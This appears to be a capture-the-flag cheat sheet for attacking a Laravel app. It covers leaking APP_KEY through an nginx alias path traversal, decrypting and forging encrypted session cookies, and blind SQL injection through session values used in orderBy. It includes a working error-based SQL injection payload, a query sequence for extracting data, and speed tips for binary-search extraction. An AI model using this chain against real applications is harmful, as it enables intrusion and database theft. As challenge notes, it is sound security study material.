# Laravel: leaked APP_KEY -> session cookie forgery -> SQLi (nginxatsu pattern)

Trigger: Laravel app + readable `.env` (often via nginx `alias` traversal like
`/assets../.env`) + `SESSION_DRIVER=cookie` + session values flowing into the
query builder.

## Chain

1. Leak `APP_KEY=base64:...` -> 32-byte AES-256 key.
2. Decrypt the session cookie pair:
   - `nginxatsu_session` = b64(JSON{iv, value, mac}); decrypt -> session id.
   - cookie NAMED with that session id -> b64(JSON{iv,value,mac}); decrypt ->
     `{"data":"<php-serialized session array>","expires":ts}`.
3. Edit the PHP-serialized session (`order`, `direction`, username...),
   re-serialize (`phpserialize.dumps`), re-encrypt AES-256-CBC (reuse the SAME
   iv), recompute `mac = HMAC-SHA256(key, iv_b64 + value_b64)`, b64 the JSON.
4. Anything in the session that reaches `orderBy()/orderByRaw()/where()`
   unquoted = SQLi you fully control.

## Blind oracle pattern

`order` payload (works through Laravel's backtick wrapping):
```
id->"')), (SELECT (CASE WHEN (COND) THEN 'SUCCESS' ELSE (select exp(~(SELECT * FROM (select user())x))) END)) #
```
TRUE -> 200, FALSE -> 500. Reuse iv; only recompute mac.

## Exfiltration order

1. Tables: `information_schema.tables WHERE table_name LIKE '%fl%'`
2. Columns: `information_schema.columns WHERE table_name = '<t>' AND column_name LIKE '%flag%'`
3. Value: `SELECT SUBSTRING(<col>,pos,1) FROM <db>.<t>`

## Speed + correctness traps (both cost me runs)

- **Always ASCII binary-search** (`ASCII(SUBSTRING(col,pos,1)) > mid`, ~7
  probes/char). Linear charset scan (~90/char) timed out twice on live instances.
- **Case-insensitive collation**: `'t'='T'` is TRUE under *_ci — use
  `= BINARY('c')` for exact extraction.
- **Placeholder bug**: `.replace("= '{ch}'", ...)` AFTER `.format()` never
  matches — apply template-level replaces BEFORE formatting.
- Verify the final string with `HEX(SUBSTRING(col,1,200)) = '<hex>'` (safe with
  quotes/apostrophes inside the flag).
- Threaded per-char fan-out on a flaky box gains little (shared cookie jar +
  retries); sequential binary search is fast enough.
